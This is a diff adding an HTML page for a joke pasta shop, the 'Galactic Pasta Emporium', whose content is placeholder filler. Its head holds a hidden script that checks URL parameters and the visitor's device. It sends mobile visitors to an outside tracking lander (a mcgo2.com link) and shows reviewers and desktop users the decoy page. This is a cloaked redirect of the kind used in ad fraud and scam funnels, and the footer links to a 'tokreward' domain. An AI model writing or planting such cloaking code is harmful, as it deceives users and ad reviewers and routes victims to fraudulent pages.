@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Pasta Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff8c00;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-direction: column-reverse;
+            align-items: center;
+            padding: 20px;
+        }
+        .pasta-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .pasta-item {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            transform: rotate(5deg);
+        }
+        footer {
+            background-color: #4b0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ff1493;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🚀 Galactic Pasta Emporium 🍝</h1>
+    </header>
+    <main>
+        <div class="pasta-container">
+            <div class="pasta-item">
+                <h2>Moon Spaghetti</h2>
+                <p>Gravity-defying noodles!</p>
+            </div>
+            <div class="pasta-item">
+                <h2>Nebula Fettuccine</h2>
+                <p>Cosmic creamy goodness!</p>
+            </div>
+            <div class="pasta-item">
+                <h2>Black Hole Ravioli</h2>
+                <p>So dense, light can't escape!</p>
+            </div>
+        </div>
+        <p>Welcome to the most out-of-this-world pasta experience!</p>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
